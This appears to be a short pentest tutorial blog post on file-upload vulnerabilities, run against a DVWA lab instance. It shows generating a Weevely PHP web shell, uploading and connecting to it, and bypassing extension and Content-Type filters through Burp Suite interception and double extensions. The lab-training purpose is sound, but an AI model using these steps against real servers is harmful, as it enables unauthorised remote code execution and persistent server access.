+++
categories = ["Pentest", "Web"]
date = "2021-02-01"
title = "Vulnerability Upload Files"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++

This is about modifying the requests that we send to the server so we can upload a shell into the server to stablish connection. First we need to generate a shell, we can use Weevely.

Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime. To generate a shell, all we need is to give it a password and the path where it is going to be created.

```  
> weevely

> weevely generate mypassword /root/shell.php
```

Now we can try to upload the shell on any web that let us upload files. If there are no filters and we succesfully upload it we can the connect listen to the file location with the weevely command.

```
> weevely http://10.0.2.4/dvwa/hackable..../uploads/shell.php
```

This will ask for the password we gave to it before and then we would have a shell running on the server.


## Medium security

If they are filtering files by the extension name, we can try and trick the server.

1. Configure Burp Suite, just open it up and set the browser proxy to local host `127.0.0.0`
2. Change the extension of the shell by renaming it to something less suspicious `shell.jpg`
3. Set the Intercept mode ON in the burp proxy tab.
4. Upload the file and change the extension back to `.php` but we leave the Content-Type to image
   
## High security

If the server is also cheking the extension name, just try to, in the interceptor, replace `shell.jpg` for `shell.php.jpg`. This way the filter may not detect that it is a php file and it stills work.